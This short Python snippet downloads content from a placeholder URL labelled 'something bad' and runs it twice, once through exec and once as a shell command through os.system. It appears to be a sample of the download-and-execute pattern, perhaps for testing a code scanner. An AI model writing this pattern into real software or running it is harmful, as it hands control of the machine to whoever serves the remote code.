import os
import requests
import urllib.request as ur


resp = requests.get("something bad")
content = resp.text
exec(content)


a = ur.urlopen("something bad")
b = a.read()
c = b.decode("utf-8")

os.system(c)
